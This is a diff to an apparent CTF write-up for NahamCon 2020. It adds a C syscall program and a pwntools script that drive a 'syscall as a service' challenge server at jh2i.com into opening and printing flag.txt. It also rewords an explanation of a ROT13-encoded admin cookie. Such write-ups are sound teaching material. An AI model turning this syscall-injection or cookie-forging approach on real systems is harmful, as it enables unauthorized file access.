@@ -112,7 +112,7 @@ The logic step here is to check the admin user. Looks like admin login has been 
   <img src="/images/CTF/NAHAMCONCTF2020/ugcc3.png"/>
 </p>
 
-Inspecting the cookies of the site we spot that there is a cookie named `user` whose value, when trying to log in as abcd, is nopq. nopq is the abcd ciphered with a caesar cipher with shift value 13, aka ROT13.  
+Inspecting the cookies of the site we spot that there is a cookie named `user` whose value, when trying to log in as abcd, is nopq. nopq is "abcd" ciphered with a caesar cipher with shift value 13, aka ROT13.  
 
 <p align="center">
   <img src="/images/CTF/NAHAMCONCTF2020/ugcc4.png"/>
@@ -342,9 +342,34 @@ Os in this challenge we have to basically open a file (assuming there is a flag.
 
 What I did is basically create a C code that performs all the actions and then reverse it in order to see what the syscalls look like. 
 
-<p align="center">
-  <img src="/images/CTF/NAHAMCONCTF2020/saas3.png"/>
-</p>
+```c
+// RazviOverflow
+
+#include <stdio.h>
+#include <sys/mman.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+int main(){
+
+  unsigned long address;
+  uint fd;
+
+  address = mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
+
+  read(0, address, 8); // 0-> stdin. 8 for flag.txt and ommit \n or whatever
+
+  fd = open(address, O_RDONLY);
+
+  read(fd, address, 100);
+
+  write(1, address, 100); // 1 -> stdout
+
+  return 0;
+}
+```
 
 The entire syscall list can be found [here](https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/).
 
@@ -360,7 +385,88 @@ After you have a working compiled binary, reverse it in order to see what value 
   <img src="/images/CTF/NAHAMCONCTF2020/saas5.png"/>
 </p>
 
-Once you copy all the values, you must provided them as input in the server. You have to write a script to automate the process, since the binary is timed.
+Once you copy all the values, you must provided them as input in the server. You have to write a script to automate the process since the binary is timed.
+
+Here's the script I used: *it's a bit messy*
+
+```python
+# RazviOverflow
+# Python3
+
+from pwn import *
+import sys
+
+#binary = process("saas")
+binary = remote("jh2i.com", 50016)
+
+'''
+Enter rax (decimal): 0
+Enter rdi (decimal): 0
+Enter rsi (decimal): 0
+Enter rdx (decimal): 0
+Enter r10 (decimal): 0
+Enter r9 (decimal): 0
+Enter r8 (decimal): 0
+Rax: 0x0
+'''
+
+# Syscalls:
+#     rax, rdi, rsi, rdx, r10, r9, r8
+mmap = [9, 0, 4096, 3, 33, 0, 0]
+
+print(binary.recv())
+message = ""
+for value in mmap:
+  binary.sendline(str(value))
+  message = binary.recv()
+  print(message)
+
+
+address = int(message.split(b"\n")[0].split(b"0x")[1], 16)
+
+print("Address of buffer is -> " + hex(address))
+
+read = [0, address, 8, 0, 0, 0]
+
+binary.sendline(str(0))
+for value in read:
+  print(binary.recv())
+  binary.sendline(str(value))
+  
+binary.sendline("flag.txt")
+print(binary.recv())
+
+open_function = [address, 0, 0, 0, 0, 0]
+
+binary.sendline(str(2))
+
+for value in open_function:
+  binary.sendline(str(value))
+  message = binary.recv()
+  print(message)
+message = binary.recv()
+file_descriptor = int(message.split(b"\n")[0].split(b"0x")[1], 16)
+print("File descriptor of flag.txt -> " + hex(file_descriptor))
+
+read = [file_descriptor, address, 100, 0, 0, 0]
+
+binary.sendline(str(0))
+
+for value in read:
+  print(binary.recv())
+  binary.sendline(str(value))
+  
+
+write = [1, address, 100, 0, 0, 0]
+
+binary.sendline(str(1))
+
+for value in write:
+  print(binary.recv())
+  binary.sendline(str(value))
+
+binary.interactive()
+```
 
 <p align="center">
   <img src="/images/CTF/NAHAMCONCTF2020/saas6.png"/>
